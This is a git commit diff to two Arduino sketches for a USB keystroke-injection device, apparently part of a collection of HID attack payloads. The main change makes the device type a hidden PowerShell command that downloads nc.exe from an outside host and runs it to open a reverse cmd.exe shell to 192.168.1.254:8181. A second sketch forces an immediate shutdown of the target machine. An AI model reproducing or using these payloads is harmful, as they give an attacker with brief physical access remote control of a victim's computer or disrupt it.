d52da404e6c4f61a37849fb8b6ddf5462dad4b2a
Nemanja Nedeljković <nemanjan00@gmail.com>
2017-01-20 01:26:11 +0100

    Refactor and netcat reverse shell

--- windows_ncReverseShell/windows_ncReverseShell.ino
+++ windows_ncReverseShell/windows_ncReverseShell.ino
@@ -21,7 +21,7 @@ void setup(){
 
 	delay(1000);
 
-	Keyboard.print("powershell -windowstyle hidden \"$a = (\\\"{0}\\putty.exe\\\" -f $(get-item hkcu:\\Environment).GetValue('tmp')); (new-object System.Net.WebClient).DownloadFile('https://the.earth.li/~sgtatham/putty/0.67/x86/putty.exe', $a); Start-Process $a\"");
+	Keyboard.print("powershell -windowstyle hidden \"$a = (\\\"{0}\\nc.exe\\\" -f $(get-item hkcu:\\Environment).GetValue('tmp')); (new-object System.Net.WebClient).DownloadFile('https://nemanja.top/nc/nc.exe', $a); Start-Process $a -ArgumentList '-d -e cmd.exe 192.168.1.254 8181'\"");
 
 	typeKey(KEY_RETURN);
 
--- windows_shutdown/windows_shutdown.ino
+++ windows_shutdown/windows_shutdown.ino
@@ -1,35 +1,33 @@
 #include "Keyboard.h"
 
-void typeKey(uint8_t key)
-{
-  Keyboard.press(key);
-  delay(50);
-  Keyboard.release(key);
+void typeKey(uint8_t key){
+	Keyboard.press(key);
+	delay(50);
+	Keyboard.release(key);
 }
 
 /* Init function */
-void setup()
-{
-  // Begining the Keyboard stream
+void setup(){
+	// Begining the Keyboard stream
 
-  Keyboard.begin();
+	Keyboard.begin();
 
-  delay(4000);
+	delay(4000);
 
-  Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press('r');
+	Keyboard.press(KEY_LEFT_GUI);
+	Keyboard.press('r');
 
-  Keyboard.releaseAll();
+	Keyboard.releaseAll();
 
-  delay(1000);
+	delay(1000);
 
-  Keyboard.print("shutdown -s -f -t 0");
+	Keyboard.print("shutdown -s -f -t 0");
 
-  typeKey(KEY_RETURN);
+	typeKey(KEY_RETURN);
 
-  delay(400);
-  
-  Keyboard.end();
+	delay(400);
+	
+	Keyboard.end();
 }
 
 /* Unused endless loop */
